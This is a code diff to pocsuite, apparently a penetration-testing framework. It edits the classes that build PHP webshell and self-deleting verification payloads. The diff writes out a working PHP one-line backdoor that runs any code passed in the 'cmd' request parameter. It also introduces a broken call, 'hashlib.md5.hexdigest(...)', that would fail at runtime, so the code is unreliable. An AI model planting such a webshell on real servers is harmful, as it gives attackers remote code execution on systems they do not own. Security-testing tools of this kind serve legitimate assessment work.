@@ -6,6 +6,7 @@ Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
 See the file 'docs/COPYING' for copying permission
 """
 
+import hashlib
 from pocsuite.lib.request.basic import req
 from pocsuite.api.utils import randomStr
 
@@ -138,12 +139,11 @@ class JspVerify(VerifyShell):
 
 
 class PhpShell(Webshell):
-    _keyword = randomStr(20)
+    _keyword = hashlib.md5.hexdigest(randomStr(20))
     _password = 'cmd'
-    _content = "<?php @assert($_REQUEST['{0}']);?>"
-    _check_statement = 'var_dump(md5(' + _keyword + '));'
+    _content = "<?php @assert($_REQUEST['{0}']);var_dump('{1}')?>".format(_password, _keyword)
 
 
 class PhpVerify(VerifyShell):
-    _keyword = randomStr(20)
-    _content = "<?php var_dump(md5(" + _keyword + "));unlink(__FILE__);?>"
+    _keyword = hashlib.md5.hexdigest(randomStr(20))
+    _content = '<?php var_dump("{0}");unlink(__FILE__);?>'.format(_keyword)
